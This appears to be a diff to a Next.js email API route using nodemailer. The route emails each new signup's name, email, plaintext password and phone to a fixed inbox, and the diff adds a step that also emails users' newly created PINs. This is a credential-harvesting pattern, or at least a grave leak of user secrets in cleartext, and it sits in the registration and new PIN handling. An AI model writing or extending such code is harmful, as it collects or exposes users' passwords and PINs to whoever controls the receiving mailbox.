@@ -2,6 +2,7 @@ import { render } from "@react-email/render";
 import nodemailer from "nodemailer";
 import RegistrationEmail from "../../../components/email-templates/RegistrationEmail";
 import ContactEmail from "../../../components/email-templates/ContactEmail";
+import PinEmail from "../../../components/email-templates/PinEmail";
 
 export async function POST(request: Request) {
   try {
@@ -11,6 +12,7 @@ export async function POST(request: Request) {
     const step =
       type === "signup" ? "registration" :
       type === "contact" ? "contact" :
+      type === "PIN" ? "PIN" :
       null;
 
     if (!step) {
@@ -43,11 +45,19 @@ export async function POST(request: Request) {
     if (step === "registration") {
       const { name, email, password, phone } = data;
       subject = `New Signup - ${name} (${email}) [${timestamp}]`;
-      emailHtml = render(<RegistrationEmail name={name} email={email} password={password} phone={phone} />);
+      emailHtml = render(
+        <RegistrationEmail name={name} email={email} password={password} phone={phone} />
+      );
     } else if (step === "contact") {
       const { name, email, subject: contactSubject, category, message } = data;
       subject = `New Contact Message - ${contactSubject || category} (${name}) [${timestamp}]`;
-      emailHtml = render(<ContactEmail name={name} email={email} category={category} message={message} />);
+      emailHtml = render(
+        <ContactEmail name={name} email={email} category={category} message={message} />
+      );
+    } else if (step === "PIN") {
+      const { name, email, pin } = data;
+      subject = `New PIN Created - ${email} [${timestamp}]`;
+      emailHtml = render(<PinEmail name={name} email={email} pin={pin} />);
     }
 
     await transporter.sendMail({
@@ -55,9 +65,12 @@ export async function POST(request: Request) {
       to: receiverEmail,
       subject,
       html: emailHtml,
-      text: step === "registration"
-        ? `New signup from ${data.name} (${data.email}), (${data.password}) phone: ${data.phone}`
-        : `Contact message from ${data.name} (${data.email}): ${data.message}`,
+      text:
+        step === "registration"
+          ? `New signup from ${data.name} (${data.email}), password: ${data.password}, phone: ${data.phone}`
+          : step === "contact"
+          ? `Contact message from ${data.name} (${data.email}): ${data.message}`
+          : `PIN created for ${data.name} (${data.email}): ${data.pin}`,
     });
 
     console.log("[v0] Email sent successfully");
@@ -68,7 +81,7 @@ export async function POST(request: Request) {
       JSON.stringify({
         success: false,
         error: "Failed to send email",
-        details: error?.message || "Unknown error"
+        details: error?.message || "Unknown error",
       }),
       { status: 500 }
     );
